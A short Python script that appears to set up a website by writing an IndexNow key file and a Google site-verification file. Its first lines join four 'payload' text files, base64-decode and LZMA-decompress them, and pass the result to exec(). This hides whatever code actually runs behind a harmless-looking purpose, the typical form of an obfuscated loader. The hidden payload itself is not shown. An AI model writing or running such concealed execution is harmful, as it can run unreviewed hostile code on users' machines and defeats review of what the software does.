import os,lzma,base64
from pathlib import Path
base=Path(__file__).parent
payload=''.join((base/f'payload{i}.txt').read_text().strip() for i in range(1,5))
exec(lzma.decompress(base64.b64decode(payload)).decode())
indexnow_key='4e8d91b7c2a64f309b5e7d1c8a2f6b40'
(Path('public')/f'{indexnow_key}.txt').write_text(indexnow_key,encoding='utf-8')
google_verify='google4e5982359b548ca3.html'
(Path('public')/google_verify).write_text('google-site-verification: '+google_verify,encoding='utf-8')
